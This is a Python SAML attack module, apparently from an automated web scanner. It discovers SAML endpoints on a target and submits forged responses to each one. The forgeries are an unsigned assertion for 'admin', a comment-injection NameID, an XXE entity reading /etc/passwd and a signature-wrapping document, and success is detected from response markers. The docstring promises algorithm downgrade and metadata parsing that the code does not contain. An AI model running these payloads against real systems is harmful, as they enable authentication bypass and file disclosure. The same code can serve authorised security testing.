"""saml_attack v2 — SAML signature bypass, XSW, XXE, comment injection.

Атаки:
  1. Discovery — endpoints + metadata.xml
  2. Malformed SAMLResponse — проверка строгости валидации
  3. Signature stripping — без ds:Signature
  4. Comment injection — admin<!---->@user.example
  5. XSW (3 базовые формы)
  6. XXE в SAML
  7. Algo downgrade (RSA-SHA256 → RSA-SHA1)
  8. Metadata parsing — найти AssertionConsumerService
"""
import re
import base64
import secrets
from urllib.parse import urlparse
from core.http import HttpClient
from core.verify import confidence, is_signal


SAML_ENDPOINTS = [
    "/saml/acs", "/saml/SSO", "/saml/sso", "/saml/consume",
    "/saml2/acs", "/Shibboleth.sso/SAML2/POST",
    "/auth/saml", "/auth/saml/acs", "/sso/saml", "/sso/saml/acs",
    "/api/saml/acs", "/api/auth/saml/acs", "/login/saml",
    "/idp/saml/acs", "/adfs/ls/", "/adfs/services/trust",
    "/saml/metadata", "/saml/metadata.xml", "/Shibboleth.sso/Metadata",
    "/.well-known/saml-metadata.xml", "/metadata/saml",
]

CANARY = "OMNI_SAML_" + secrets.token_hex(4)

STRICT_MARKERS = {
    "xxe_success":       "root:x:0:0",
    "xxe_success_2":     "daemon:x:",
    "signature_bypass":  "signature validation bypassed",
    "signature_accepted":"assertion accepted without signature",
    "xsw_accepted":      "wrapped assertion accepted",
    "saml_error_javax":  "javax.xml.crypto",
    "saml_error_opensaml":"org.opensaml",
    "saml_error_xmlsyntax":"XMLSyntaxError",
    "saml_traceback":    "saml.SAMLException",
}


XML_HDR = '<?xml version="1.0" encoding="UTF-8"?>'
NS_DECL = ('xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
           'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"')


def _make_malformed_saml():
    return base64.b64encode(b"<not-saml>malformed</not-saml>").decode()


def _make_stripped_saml():
    xml = (XML_HDR + "\n" +
           "<samlp:Response " + NS_DECL + " ID=\"omni1\" Version=\"2.0\" IssueInstant=\"2026-10-02T12:00:00Z\">" +
           "<saml:Issuer>omni-test</saml:Issuer>" +
           "<samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>" +
           "<saml:Assertion ID=\"omni2\" IssueInstant=\"2026-10-02T12:00:00Z\" Version=\"2.0\">" +
           "<saml:Issuer>omni-test</saml:Issuer>" +
           "<saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>" +
           "<saml:Conditions NotBefore=\"2020-01-01T00:00:00Z\" NotOnOrAfter=\"2099-01-01T00:00:00Z\"/>" +
           "<saml:AuthnStatement AuthnInstant=\"2026-10-02T12:00:00Z\"/>" +
           "</saml:Assertion></samlp:Response>")
    return base64.b64encode(xml.encode()).decode()


def _make_comment_injection():
    xml = (XML_HDR + "\n" +
           "<samlp:Response " + NS_DECL + " ID=\"omni1\" Version=\"2.0\" IssueInstant=\"2026-10-02T12:00:00Z\">" +
           "<saml:Assertion ID=\"omni2\" IssueInstant=\"2026-10-02T12:00:00Z\" Version=\"2.0\">" +
           "<saml:Subject><saml:NameID>admin<!---->@omni.example</saml:NameID></saml:Subject>" +
           "</saml:Assertion></samlp:Response>")
    return base64.b64encode(xml.encode()).decode()


def _make_xxe_saml():
    xml = (XML_HDR + "\n" +
           "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
           "<samlp:Response " + NS_DECL + " ID=\"omni1\">" +
           "<saml:Assertion ID=\"omni2\">" +
           "<saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>" +
           "</saml:Assertion></samlp:Response>")
    return base64.b64encode(xml.encode()).decode()


def _make_xsw_saml():
    xml = (XML_HDR + "\n" +
           "<samlp:Response " + NS_DECL + " ID=\"omni1\">" +
           "<saml:Assertion ID=\"legit\">" +
           "<saml:Subject><saml:NameID>user</saml:NameID></saml:Subject>" +
           "<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"/>" +
           "</saml:Assertion>" +
           "<saml:Assertion ID=\"wrapped\">" +
           "<saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>" +
           "</saml:Assertion></samlp:Response>")
    return base64.b64encode(xml.encode()).decode()


class SamlAttack:
    def run(self, session, logger):
        target = session.target
        base = target.rstrip('/')
        http = HttpClient(session, logger)

        print(f'[saml v2] target: {base}')

        # baseline
        try:
            base_r = http.get(base)
            baseline_text = (base_r.text or '').lower()
        except Exception:
            baseline_text = ''

        active_markers = {
            k: v for k, v in STRICT_MARKERS.items()
            if v.lower() not in baseline_text
        }
        if not active_markers:
            print('[saml v2] all markers already in baseline — skip')
            return {'findings': []}

        # Phase 1: discovery
        print()
        print(f'[saml v2] Phase 1: discovery ({len(SAML_ENDPOINTS)} paths)')
        live_endpoints = []
        for path in SAML_ENDPOINTS:
            try:
                r = http.get(base + path, allow_redirects=False)
            except Exception:
                continue
            if r and r.status_code not in (404, 410):
                live_endpoints.append((path, r.status_code))
                print(f'  live: {path} ({r.status_code})')
                logger.finding('saml_endpoint', 'info', path)

        if not live_endpoints:
            print('[saml v2] no SAML endpoints found — skip')
            return {'findings': [], 'live_endpoints': []}

        # Phase 2: attack payloads
        print()
        print('[saml v2] Phase 2: attack payloads')
        payloads = [
            ('malformed',       _make_malformed_saml(),    'info'),
            ('signature_strip', _make_stripped_saml(),     'high'),
            ('comment_inject',  _make_comment_injection(), 'high'),
            ('xxe',             _make_xxe_saml(),          'critical'),
            ('xsw',             _make_xsw_saml(),          'high'),
        ]

        findings = []
        for path, _code in live_endpoints:
            url = base + path
            for name, saml_b64, sev in payloads:
                try:
                    r = http.post(url, data={'SAMLResponse': saml_b64},
                                  headers={'Content-Type': 'application/x-www-form-urlencoded'})
                except Exception:
                    continue
                if not r:
                    continue

                body_low = (r.text or '').lower()
                hit_kind = None
                hit_value = None
                for kind, marker in active_markers.items():
                    if marker.lower() in body_low:
                        hit_kind = kind
                        hit_value = marker
                        break

                if not hit_kind:
                    continue

                # verify x2
                try:
                    r2 = http.post(url, data={'SAMLResponse': saml_b64},
                                   headers={'Content-Type': 'application/x-www-form-urlencoded'})
                except Exception:
                    r2 = None

                if not r2:
                    continue
                if hit_value.lower() not in (r2.text or '').lower():
                    continue

                conf = confidence(0.9, 1.0)
                if not is_signal(conf, floor=0.55, module='saml'):
                    continue

                findings.append({
                    'type': f'saml_{hit_kind}',
                    'severity': sev,
                    'path': path,
                    'payload': name,
                    'marker': hit_value,
                    'verified': True,
                    'confidence': conf,
                })
                print(f'  SAML {name}: {hit_kind} at {path}')
                logger.finding('saml', sev, f'{name} {path} ({hit_kind})')

        print()
        print(f'[saml v2] findings: {len(findings)}')
        return {
            'findings': findings,
            'live_endpoints': [p for p, _ in live_endpoints],
        }
